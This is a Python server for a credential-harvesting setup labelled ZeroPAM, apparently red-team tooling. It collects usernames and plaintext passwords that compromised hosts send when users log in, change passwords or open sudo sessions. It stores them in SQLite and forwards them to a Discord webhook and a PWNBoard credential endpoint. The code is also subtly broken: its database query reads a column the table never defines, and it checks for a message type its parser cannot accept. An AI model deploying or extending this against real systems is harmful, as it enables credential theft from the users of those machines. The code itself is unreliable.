import os
import re
import socket
import sqlite3
import argparse
import requests
import threading
import logging

from contextlib import closing
from typing import Optional
from dataclasses import dataclass
from dotenv import load_dotenv

# Maximum concurrent client handlers to prevent file-descriptor exhaustion
MAX_CONCURRENT_CLIENTS = int(os.getenv("MAX_CONNS", "200"))
ACCESS_TOKEN = os.environ.get("PWNBOARD_ACCESS_TOKEN") or None
WEBHOOK_URL = os.environ.get('WEBHOOK_URL') or None
DB_PATH = "logins.db"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

MESSAGE_RE = re.compile(
    r"^\s*(?P<ip>\S+)\s*-\s*"
    r"(?P<message>USER AUTHENTICATED|USER CHANGED PASSWORD|SUDO SESSION OPENED)"
    r"(?:\s*:\s*(?P<username>[^:]+?)\s*:(?P<password>.*))?\s*$"
)

@dataclass
class LoginEvent:
    source_ip: str
    message: str
    username: Optional[str] = None
    password: Optional[str] = None

def parse_message(raw: str) -> Optional[LoginEvent]:
    """Strictly parse the wire protocol. Returns None for anything that
    doesn't match exactly, including stray bytes from scanners/crawlers."""
    match = MESSAGE_RE.match(raw)
    if not match:
        return None
 
    message = match.group("message")
    username = match.group("username")
    password_raw = match.group("password")
 
    username = username.strip() if username else None
 
    password: Optional[str]
    if password_raw is None:
        password = None
    else:
        password = password_raw.strip()
        if password == ":":
            # SESSION OPENED encodes "no password" as a trailing empty
            # field, e.g. "bob::" -- normalize that to an empty string.
            password = ""
 
    if message == "SUDO SESSION OPENED":
        if not username:
            return None
        password = password or ""
    elif message != "KEEP ALIVE":
        if not username or not password:
            return None
 
    return LoginEvent(
        source_ip=match.group("ip").strip(),
        message=message,
        username=username,
        password=password,
    )
 

def server_args(cmd_str):
    parser = argparse.ArgumentParser(description="Server meant for use with ZeroPAM")
    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)",
                         type=int, dest="port", action="store", default=5000)
    parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
    parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
    parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
    parser.add_argument('--pwnboard', dest="pwnboard", action="store_true", help="Enable cred send to PWNBoard")
    parser.add_argument('--pwnboard-host', metavar="<PWNBOARD WEBSITE>", help="Used with --pwnboard; PWNBoard website to send POST requests to (default localhost:8080)",
                         type=str, dest="pwnhost", action="store", default="localhost:8080")
    return parser.parse_args() if not cmd_str else parser.parse_args(cmd_str.split())
 
def send_pwnboard(event: LoginEvent, pwnhost: str) -> bool:
    host = f"{pwnhost}/creds"
    headers = {"Content-Type": "application/json"}
    if ACCESS_TOKEN:
        headers["Authorization"] = f"Bearer {ACCESS_TOKEN}"
 
    pwn_data = {
        "ip": event.source_ip,
        "application": "ZeroPAM",
        "username": event.username,
        "password": event.password,
    }
 
    try:
        r = requests.post(host, json=pwn_data, headers=headers, timeout=3)
        if r.status_code == 200:
            logging.info("Posted data to PWNBoard!")
            return True
        logging.warning("Unsuccessful PWNBoard POST: Code: %s, Response: %s", r.status_code, r.text)
        return False
    except requests.RequestException as e:
        logging.warning("PWNBoard POST error: %s", e)
        return False

def send_discord(event: LoginEvent) -> None:
    if not WEBHOOK_URL or event.message == "KEEP ALIVE":
        return
 
    fields = []
    color = 0
    if event.message in ("USER AUTHENTICATED", "USER CHANGED PASSWORD"):
        fields = [
            {"name": "Username", "value": event.username, "inline": True},
            {"name": "Password", "value": event.password, "inline": True},
        ]
        color = 0x1780e8 if event.message == "USER CHANGED PASSWORD" else 0xf5f50a
    elif event.message == "SUDO SESSION OPENED":
        fields = [{"name": "ADMIN USER", "value": event.username}]
        color = 0x07fc03
 
    hook_data = {
        "content": f"{event.source_ip} - {event.message}: {event.username}: {event.password}",
        "username": "ZeroPAM Bot",
        "avatar_url": "https://cdn.discordapp.com/emojis/1203535228975448094.webp",
        "embeds": [{
            "description": f"**UPDATED FROM {event.source_ip}**",
            "fields": fields,
            "color": color,
        }],
    }
 
    try:
        r = requests.post(WEBHOOK_URL, json=hook_data, timeout=5)
        if r.status_code != 200:
            logging.warning("Unsuccessful Discord POST: Code: %s, Response: %s", r.status_code, r.text)
    except requests.RequestException as e:
        logging.warning("Discord webhook error: %s", e)

def init_db(db_path: str = DB_PATH) -> None:
    """Create the table once at startup instead of on every write."""
    with closing(sqlite3.connect(db_path)) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS passwords(
                ip TEXT NOT NULL,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                known_admin INTEGER DEFAULT 0,
                PRIMARY KEY (ip, username)
            );
        ''')
        conn.commit()

def write_db(event: LoginEvent, db_path: str = DB_PATH) -> int:
    if event.message == "KEEP ALIVE":
        return 0
 
    with closing(sqlite3.connect(db_path)) as conn:
        cur = conn.execute(
            'SELECT password, admin FROM passwords WHERE username = ? AND ip = ?;',
            (event.username, event.source_ip),
        )
        existing = cur.fetchone()
 
        retval = 0
        if event.message in ("USER AUTHENTICATED", "USER CHANGED PASSWORD"):
            if existing is None:
                conn.execute(
                    'INSERT INTO passwords(ip, username, password) VALUES (?, ?, ?);',
                    (event.source_ip, event.username, event.password),
                )
                retval = 1
            elif existing[0] != event.password:
                logging.info("Updating password for user %s...", event.username)
                conn.execute(
                    'UPDATE passwords SET password = ? WHERE username = ? AND ip = ?;',
                    (event.password, event.username, event.source_ip),
                )
                retval = 1
        elif event.message == "SUDO SESSION OPENED":
            if existing is not None:
                if existing[1] != 1:
                    conn.execute(
                        'UPDATE passwords SET known_admin = 1 WHERE username = ? AND ip = ?;',
                        (event.username, event.source_ip),
                    )
                    retval = 1
            else:
                retval = -1
 
        conn.commit()
        return retval

def handle_client(lock, c, addr, cmd_args, sem: threading.BoundedSemaphore):
    try:
        c.settimeout(10)
        raw_data = c.recv(1024)
        try:
            data = raw_data.decode()
        except UnicodeDecodeError:
            logging.debug("Non-UTF8 data from %s: %r", addr, raw_data)
            return
 
        event = parse_message(data)
        if event is None:
            logging.debug("Ignoring non-protocol data from %s: %r", addr, data)
            return
 
        if not cmd_args.onlynew:
            with lock:
                logging.info("Received from %s - %s", addr, data.strip())
 
        retval = 0
        if not cmd_args.nodb:
            with lock:
                retval = write_db(event)
 
        if cmd_args.onlynew and retval == 1:
            with lock:
                logging.info("Received from %s - %s", addr, data.strip())
 
        # Perform network calls outside of the lock
        if cmd_args.discord and (not cmd_args.onlynew or retval == 1):
            send_discord(event)
 
        if cmd_args.pwnboard:
            send_pwnboard(event, cmd_args.pwnhost)
 
    except socket.timeout:
        pass
    except Exception:
        logging.exception("Error handling client %s", addr)
    finally:
        try:
            c.close()
        except Exception:
            pass
        try:
            sem.release()
        except Exception:
            pass

def start_server(cmd_args, stop_event=None):
    if not cmd_args.nodb:
        init_db()
 
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    logging.info("Created socket")
 
    server_socket.bind(('', cmd_args.port))
    server_socket.listen(256)
    if stop_event is not None:
        server_socket.settimeout(1.0)
    logging.info("Server listening for incoming connections on port %s...", cmd_args.port)
 
    lock = threading.Lock()
    sem = threading.BoundedSemaphore(MAX_CONCURRENT_CLIENTS)
 
    try:
        if not stop_event:
            while True:
                sem.acquire()
                client_socket, addr = server_socket.accept()
                client_thread = threading.Thread(
                    target=handle_client, args=(lock, client_socket, addr, cmd_args, sem), daemon=True
                )
                client_thread.start()
        else:
            while not stop_event.is_set():
                try:
                    sem.acquire()
                    client_socket, addr = server_socket.accept()
                except socket.timeout:
                    sem.release()
                    continue
                client_thread = threading.Thread(
                    target=handle_client, args=(lock, client_socket, addr, cmd_args, sem), daemon=True
                )
                client_thread.start()
    finally:
        try:
            server_socket.close()
        except Exception:
            pass

def setup(cmd_args=None, stop_event=None):
    load_dotenv()

    global ACCESS_TOKEN
    global WEBHOOK_URL

    ACCESS_TOKEN = os.environ.get("PWNBOARD_ACCESS_TOKEN") or None
    WEBHOOK_URL = os.environ.get('WEBHOOK_URL') or None

    if isinstance(cmd_args, str) or cmd_args is None:
        cmd_args = server_args(cmd_args)
 
        if cmd_args.discord and not WEBHOOK_URL:
            logging.error("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! "
                           "Please either create a .env file with the WEBHOOK_URL or set the environment "
                           "variable globally to use this setting.")
            return False
 
        if cmd_args.nodb and cmd_args.onlynew:
            logging.error("FATAL ERROR: You cannot run no-db and only-new mode at the same time! "
                           "Database checking is required for checking if request is new!")
            return False
 
    try:
        start_server(cmd_args, stop_event)
    except KeyboardInterrupt:
        logging.info("Shutting down.")

if (__name__ == '__main__'):
    if(not setup()):
        exit(1)